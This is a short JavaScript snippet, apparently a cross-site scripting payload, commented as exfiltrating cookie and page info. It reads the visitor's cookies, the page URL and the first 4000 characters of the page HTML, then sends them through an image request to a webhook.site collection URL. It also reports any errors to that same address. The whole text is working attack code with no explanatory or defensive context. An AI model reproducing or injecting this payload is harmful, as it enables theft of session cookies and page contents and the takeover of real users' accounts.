// exfiltrate cookie + page info
try{
  var d = document.cookie;
  var h = document.documentElement ? document.documentElement.innerHTML.slice(0,4000) : '';
  var u = location.href;
  new Image().src='//webhook.site/588fed5a-fca5-474e-a28a-f8779a12ecdb?c='+encodeURIComponent(d)+'&u='+encodeURIComponent(u)+'&h='+encodeURIComponent(h);
}catch(e){ new Image().src='//webhook.site/588fed5a-fca5-474e-a28a-f8779a12ecdb?err='+encodeURIComponent(e.message); }
